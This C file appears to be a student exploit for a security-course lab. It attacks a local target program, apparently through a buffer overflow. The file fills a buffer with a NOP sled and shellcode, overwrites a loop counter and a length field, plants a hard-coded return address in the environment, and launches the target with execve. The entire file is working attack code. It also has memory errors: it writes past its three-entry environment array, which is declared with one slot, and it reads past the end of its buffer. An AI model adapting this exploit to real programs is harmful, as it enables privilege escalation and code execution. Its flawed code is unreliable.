#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

#define DEFAULT_BUFFER_SIZE  270
#define NOP 0x90
#define ZERO 0x00
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	int bsize = DEFAULT_BUFFER_SIZE;
	char* buff, *ptr;
	if (argc>1) bsize = atoi(argv[1]);	
	
	if(!(buff = (char*)malloc(bsize * sizeof(char)))){
		printf("can't allocate memory\n");
		exit(0);	
	}

	unsigned long *add_ptr;
	int i;
	for (i = 0; i < bsize; i++){
		buff[i] = NOP;
	}

	ptr = buff + bsize - strlen(shellcode)  - 28;
	for (i=0; i<strlen(shellcode); i++){
		*(ptr++) = shellcode[i];
	}


	ptr = buff + bsize  - 6;
	// overwriting least byte of j to  
	*(ptr++) = 0x0B;

	// overwriting len to 
	ptr = buff + bsize  - 2;
	*(ptr++) = 0x1C;
	*(ptr++) = 0x01;



	char* add;
	char* nop;
	add = (char*)malloc(4 * sizeof(char));
	nop = (char*)malloc(7 * sizeof(char));
	for (i = 0; i < 7; i++){
		nop[i] = NOP;
	}

	ptr = add;
	*ptr = 0x40;
	ptr++;
	*ptr = 0xfd;
	ptr++;
	*ptr = 0xa4;
	ptr++;
	*ptr = 0x40;


	args[0] = TARGET;
	args[1] = buff;
	args[2] = NULL;

	env[0] = "\x00";
	env[1] = nop;
	env[2] = add;
	printf("the content of buff is %c\n",buff[280]);
	printf("the size of input is %d\n",strlen(buff));
	
	
	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
